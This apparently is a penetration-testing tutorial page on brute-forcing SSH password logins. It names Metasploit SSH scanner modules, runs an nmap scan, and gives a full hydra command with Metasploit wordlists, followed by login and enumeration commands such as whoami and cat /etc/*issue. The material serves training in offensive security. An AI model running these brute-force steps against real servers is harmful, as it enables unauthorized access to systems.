# 3 - Exploiting SSH

### **Exploiting SSH**

* SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet.
* It is typically used for remote access to servers and systems.
* SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.
* SSH authentication can be configured in two ways:
  * Username & password authentication
  * Key based authentication
* In the case of username and password authentication, we can perform a brute-force attack on the SSH server in order to identify legitimate credentials and consequently gain access to the target system.

## **Practical Demonstration**

1 - Identify Target IP.

{% code overflow="wrap" lineNumbers="true" %}
```bash
auxiliary/scanner/ssh/ssh_version
auxiliary/scanner/ssh/ssh_login
```
{% endcode %}

2 - `nmap -sV $ip` - nmap scan.

3 `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt -t 4 $ip ssh` - performing a bruteforce to obtain login creds.

When you terminate the bruteforce session, you can always resume the session with `hydra -R` .

4 - \`ssh sysadmin@$ip - Connect to the target system via SSH with legitimate credentials.

> we can issue some cmds to enumerate, `whoami` , `groups sysadmin` - show the groups the user is part of. `cat /etc/*issue` - OS version, `uname -r` - kernel version.
